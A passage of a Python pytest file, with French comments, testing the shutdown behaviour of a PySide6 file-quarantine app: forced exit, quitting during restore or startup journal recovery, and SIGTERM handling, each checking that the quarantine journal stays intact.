        assert seen["dialog"]
        assert seen["while_waiting"] >= 2
        assert (restored, failed) == (0, 0)
        assert proc.returncode == 0

    def test_forced_exit_during_a_long_move_returns_immediately(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        """20 s de move : « Forcer la fermeture » sort en moins d'une seconde.

        Le journal « en cours » reste repris : le fichier en quarantaine
        est confirmé, puis restauré.
        """
        import json
        import logging
        import threading
        import time

        from PySide6.QtWidgets import QApplication, QMessageBox, QPushButton

        import sentinel.quarantine as quarantine
        from sentinel.gui.app import _SHUTDOWN_TEXT, request_graceful_quit
        from sentinel.quarantine import recover_journal, restore_paths

        release = threading.Event()
        holding = threading.Event()
        exited = {"code": None}
        payload = b"alice-notes\n"
        root = logging.getLogger()
        saved_handlers = list(root.handlers)

        def crash() -> None:
            holding.set()
            release.wait(20)
            raise RuntimeError("simulated kill before confirm")

        def question(*_args: object, **_kwargs: object):
            return QMessageBox.StandardButton.Yes

        def fake_exit(code: int = 0) -> None:
            exited["code"] = code

        quarantine._crash_before_commit = crash
        monkeypatch.setattr(QMessageBox, "question", question)
        monkeypatch.setattr(QMessageBox, "warning", lambda *_a, **_k: None)
        monkeypatch.setattr("sentinel.gui.app.os._exit", fake_exit)
        dest = tmp_path / "kept"
        window.quarantine.dest.setText(str(dest))
        manifest = Path(window.quarantine.manifest.text())
        src_dir = tmp_path / "inbox"
        src_dir.mkdir()
        src = src_dir / "notes.txt"
        src.write_bytes(payload)
        thread = None
        try:
            window.quarantine.quarantine_files([src])
            qtbot.waitUntil(holding.is_set, timeout=5000)
            assert b"en cours" in manifest.read_bytes()
            assert not src.exists()
            request_graceful_quit()

            def modal_ready() -> bool:
                dialog = QApplication.activeModalWidget()
                return dialog is not None and dialog.windowTitle() == _SHUTDOWN_TEXT

            qtbot.waitUntil(modal_ready, timeout=2000)
            dialog = QApplication.activeModalWidget()
            assert dialog is not None
            button = dialog.findChild(QPushButton)
            assert button is not None
            assert button.text() == "Forcer la fermeture"
            started = time.monotonic()
            button.click()
            elapsed = time.monotonic() - started
            assert elapsed < 1.0
            assert exited["code"] == 0
            assert b"en cours" in manifest.read_bytes()
        finally:
            release.set()
            quarantine._crash_before_commit = None
            thread = window.quarantine._put_thread
            if thread is not None:
                assert thread.wait(5000)
            root.handlers[:] = saved_handlers
            QApplication.processEvents()
        assert thread is not None
        issues = recover_journal(manifest)
        assert issues == []
        rows = [
            json.loads(line)
            for line in manifest.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        assert rows[-1]["_status"] == "done"
        restored, fails = restore_paths(manifest, dest)
        assert fails == []
        assert len(restored) == 1
        assert src.read_bytes() == payload

    def _journal_payload(manifest: Path) -> str:
        import json

        record = {
            "_status": "en cours",
            "id": "keep",
            "original": "/home/alice/notes.txt",
            "quarantined": str(manifest.parent / "notes.txt"),
            "sha256": "abc",
            "size": 1,
        }
        return json.dumps(record, sort_keys=True) + "\n"

    def test_quit_during_restore_says_interrupted_and_keeps_the_journal(
        window, qtbot, monkeypatch, tmp_path
    ) -> None:
        """Quitter pendant l'attente ne dit pas qu'on a restauré, et ne touche pas au journal."""
        import time

        from PySide6.QtCore import QTimer
        from PySide6.QtWidgets import QApplication, QLabel, QMessageBox

        import sentinel.gui.app as gui_app
        from sentinel.gui.app import (
            JOURNAL_WAIT_TEXT,
            RESTORE_INTERRUPTED_TEXT,
            _background_threads,
            _CallThread,
            request_graceful_quit,
            wait_for_background_threads,
        )

        monkeypatch.setattr("sentinel.quarantine.JOURNAL_LOCK_TIMEOUT", 8.0)
        monkeypatch.setattr(
            QMessageBox,
            "question",
            lambda *_a, **_k: QMessageBox.StandardButton.Yes,
        )
        warnings: list[str] = []
        monkeypatch.setattr(
            QMessageBox,
            "warning",
            lambda *args, **_k: warnings.append(str(args[2]) if len(args) > 2 else ""),
        )

        def refuse_exit(code: int = 0) -> None:
            raise AssertionError(f"os._exit({code})")

        monkeypatch.setattr("sentinel.gui.app.os._exit", refuse_exit)
        manifest = Path(window.quarantine.manifest.text())
        manifest.parent.mkdir(parents=True, exist_ok=True)
        payload = _journal_payload(manifest)
        manifest.write_text(payload, encoding="utf-8")
        ready = tmp_path / "ready"
        release = tmp_path / "release"
        seen = {"dialog": False}

        def indicator_visible() -> bool:
            widgets = list(QApplication.topLevelWidgets())
            active = QApplication.activeModalWidget()
            if active is not None:
                widgets.append(active)
            for widget in widgets:
                for label in widget.findChildren(QLabel):
                    if label.text() == JOURNAL_WAIT_TEXT and label.isVisible():
                        return True
            return False

        def poke() -> None:
            if not indicator_visible():
                return
            seen["dialog"] = True
            request_graceful_quit()

        proc = _hold_manifest(manifest, ready, release)
        timer = QTimer()
        timer.timeout.connect(poke)
        try:
            _wait_ready(proc, ready)
            timer.start(20)
            window._show(3)
            started = time.monotonic()
            window.quarantine.restore_selected()
            elapsed = time.monotonic() - started
        finally:
            timer.stop()
            _stop_holder(proc, release)
            gui_app._quit_in_progress = False
        assert seen["dialog"]
        assert elapsed < 3.0
        text = window.quarantine.log.toPlainText()
        assert RESTORE_INTERRUPTED_TEXT in text
        assert "Restaurés :" not in text
        assert warnings == []
        assert manifest.read_text(encoding="utf-8") == payload
        assert proc.returncode == 0
        wait_for_background_threads()
        assert not any(
            isinstance(thread, _CallThread) and thread.isRunning() for thread in _background_threads
        )

    def test_quit_during_startup_recovery_says_interrupted(qtbot, tmp_path, monkeypatch) -> None:
        import time

        from PySide6.QtCore import QSettings, QTimer
        from PySide6.QtWidgets import QApplication, QLabel, QMessageBox

        import sentinel.gui.app as gui_app
        from sentinel.gui.app import (
            JOURNAL_WAIT_TEXT,
            RECOVERY_INTERRUPTED_TEXT,
            _background_threads,
            _CallThread,
            request_graceful_quit,
            wait_for_background_threads,
        )

        monkeypatch.setattr("sentinel.gui.app.data_dir", lambda: tmp_path / "state")
        monkeypatch.setattr("sentinel.quarantine.JOURNAL_LOCK_TIMEOUT", 8.0)
        warnings: list[str] = []
        monkeypatch.setattr(
            QMessageBox,
            "warning",
            lambda *args, **_k: warnings.append(str(args[2]) if len(args) > 2 else ""),
        )

        def refuse_exit(code: int = 0) -> None:
            raise AssertionError(f"os._exit({code})")

        monkeypatch.setattr("sentinel.gui.app.os._exit", refuse_exit)
        manifest = tmp_path / "state" / "quarantine" / "manifest.jsonl"
        manifest.parent.mkdir(parents=True, exist_ok=True)
        payload = _journal_payload(manifest)
        manifest.write_text(payload, encoding="utf-8")
        ready = tmp_path / "ready"
        release = tmp_path / "release"
        seen = {"dialog": False}

        def indicator_visible() -> bool:
            widgets = list(QApplication.topLevelWidgets())
            active = QApplication.activeModalWidget()
            if active is not None:
                widgets.append(active)
            for widget in widgets:
                for label in widget.findChildren(QLabel):
                    if label.text() == JOURNAL_WAIT_TEXT and label.isVisible():
                        return True
            return False

        def poke() -> None:
            if not indicator_visible():
                return
            seen["dialog"] = True
            request_graceful_quit()

        proc = _hold_manifest(manifest, ready, release)
        timer = QTimer()
        timer.timeout.connect(poke)
        try:
            _wait_ready(proc, ready)
            timer.start(20)
            started = time.monotonic()
            settings = QSettings(str(tmp_path / "settings.ini"), QSettings.Format.IniFormat)
            host = MainWindow(settings=settings)
            qtbot.addWidget(host)
            elapsed = time.monotonic() - started
        finally:
            timer.stop()
            _stop_holder(proc, release)
            gui_app._quit_in_progress = False
        assert seen["dialog"]
        assert elapsed < 3.0
        text = host.quarantine.log.toPlainText()
        assert RECOVERY_INTERRUPTED_TEXT in text
        assert "Rien n'a été supprimé" not in text
        assert warnings == []
        assert manifest.read_text(encoding="utf-8") == payload
        assert proc.returncode == 0
        wait_for_background_threads()
        assert not any(
            isinstance(thread, _CallThread) and thread.isRunning() for thread in _background_threads
        )

    def test_sigterm_during_lock_wait_exits_cleanly(tmp_path: Path) -> None:
        """Ctrl+C / SIGTERM : pas d'abort 134, pas de QThread détruit, journal intact."""
        import json
        import signal
        import subprocess
        import textwrap
        import time

        if os.name != "posix":
            pytest.skip("SIGTERM")

        script = tmp_path / "gui_quit.py"
        script.write_text(
            textwrap.dedent(
                """
                import os
                import sys
                from pathlib import Path

                os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

                mode = sys.argv[1]
                sentinel = Path(sys.argv[2])
                result = Path(sys.argv[3])

                from PySide6.QtCore import QTimer
                from PySide6.QtWidgets import QApplication, QLabel

                from sentinel.gui.app import JOURNAL_WAIT_TEXT, MainWindow, run_event_loop

                app = QApplication(sys.argv)
                window_box = {}

                def mark_waiting() -> None:
                    widgets = list(QApplication.topLevelWidgets())
                    active = QApplication.activeModalWidget()
                    if active is not None:
                        widgets.append(active)
                    for widget in widgets:
                        for label in widget.findChildren(QLabel):
                            if label.text() == JOURNAL_WAIT_TEXT and label.isVisible():
                                if not sentinel.exists():
                                    sentinel.write_text("waiting", encoding="utf-8")
                                return

                timer = QTimer()
                timer.timeout.connect(mark_waiting)
                timer.start(20)

                if mode == "restore":
                    go = Path(sys.argv[4])

                    def maybe_restore() -> None:
                        window = window_box.get("window")
                        if window is None or getattr(maybe_restore, "started", False):
                            return
                        if go.exists():
                            maybe_restore.started = True
                            window.quarantine.restore_without_dialog()

                    poll = QTimer()
                    poll.timeout.connect(maybe_restore)
                    poll.start(20)

                window = MainWindow()
                window_box["window"] = window
                window.show()
                if mode == "restore":
                    Path(sys.argv[5]).write_text("up", encoding="utf-8")
                code = run_event_loop(app)
                result.write_text(window.quarantine.log.toPlainText(), encoding="utf-8")
                raise SystemExit(code)
                """
            ),
            encoding="utf-8",
        )

        def run_mode(mode: str, manifest: Path, payload: str) -> None:
            manifest.parent.mkdir(parents=True, exist_ok=True)
            manifest.write_text(payload, encoding="utf-8")
            ready = tmp_path / f"{mode}-ready"
            release = tmp_path / f"{mode}-release"
            sentinel = tmp_path / f"{mode}-sentinel"
            result = tmp_path / f"{mode}-result.txt"
            for path in (ready, release, sentinel, result):
                if path.exists():
                    path.unlink()
            env = os.environ.copy()
            env["QT_QPA_PLATFORM"] = "offscreen"
            # HOME est synthétique : le site-packages utilisateur ne suit pas.
            env["PYTHONPATH"] = os.pathsep.join([str(ROOT), *sys.path])
            env["PYTHONUNBUFFERED"] = "1"
            home = tmp_path / f"{mode}-home"
            home.mkdir(parents=True, exist_ok=True)
            env["HOME"] = str(home)
            env["XDG_DATA_HOME"] = str(manifest.parent.parent.parent)
            env["XDG_CONFIG_HOME"] = str(tmp_path / f"{mode}-config")
            env["XDG_CACHE_HOME"] = str(tmp_path / f"{mode}-cache")
            args = [sys.executable, str(script), mode, str(sentinel), str(result)]
            holder = None
            if mode == "restore":
                go = tmp_path / f"{mode}-go"
                booted = tmp_path / f"{mode}-booted"
                args.extend([str(go), str(booted)])
            else:
                holder = _hold_manifest(manifest, ready, release)
                _wait_ready(holder, ready)
            proc = subprocess.Popen(
                args,
                cwd=str(tmp_path),
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            try:
                if mode == "restore":
                    deadline = time.monotonic() + 20
                    while not booted.exists():
                        if proc.poll() is not None:
                            _out, err = proc.communicate()
                            raise AssertionError(err)
                        if time.monotonic() > deadline:
                            raise AssertionError("interface non prête")
                        time.sleep(0.02)
                    holder = _hold_manifest(manifest, ready, release)
                    _wait_ready(holder, ready)
                    go.write_text("go", encoding="utf-8")
                deadline = time.monotonic() + 20
                while not sentinel.exists():
                    if proc.poll() is not None:
                        _out, err = proc.communicate()
                        raise AssertionError(err)
                    if time.monotonic() > deadline:
                        raise AssertionError("attente du journal invisible")
                    time.sleep(0.02)
                proc.send_signal(signal.SIGTERM)
                started = time.monotonic()
                try:
                    _out, err = proc.communicate(timeout=8)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    _out, err = proc.communicate()
                    raise AssertionError(f"SIGTERM n'a pas terminé le processus\n{err}") from None
                elapsed = time.monotonic() - started
            finally:
                if holder is not None:
                    _stop_holder(holder, release)
            assert elapsed < 5.0
            assert proc.returncode == 0, err
            assert proc.returncode not in (134, -signal.SIGABRT)
            assert "QThread: Destroyed" not in err
            assert "Destroyed while thread" not in err
            logged = result.read_text(encoding="utf-8") if result.is_file() else ""
            if mode == "startup":
                assert "Reprise du journal interrompue" in logged
                assert "Reprise du journal interrompue" in err
            else:
                assert "Restauration interrompue" in logged
                assert "Restauration interrompue" in err
                assert "Restaurés :" not in logged
            assert manifest.read_text(encoding="utf-8") == payload
            assert "Rien n'a été supprimé" not in logged

        startup_manifest = tmp_path / "xdg" / "sentinel" / "quarantine" / "manifest.jsonl"
        startup_payload = _journal_payload(startup_manifest)
        run_mode("startup", startup_manifest, startup_payload)

        restore_manifest = tmp_path / "xdg2" / "sentinel" / "quarantine" / "manifest.jsonl"
        restore_record = {
            "_status": "done",
            "id": "keep",
            "original": "/home/alice/notes.txt",
            "quarantined": str(restore_manifest.parent / "notes.txt"),
            "sha256": "abc",
            "size": 1,
        }
        restore_payload = json.dumps(restore_record, sort_keys=True) + "\n"
        run_mode("restore", restore_manifest, restore_payload)
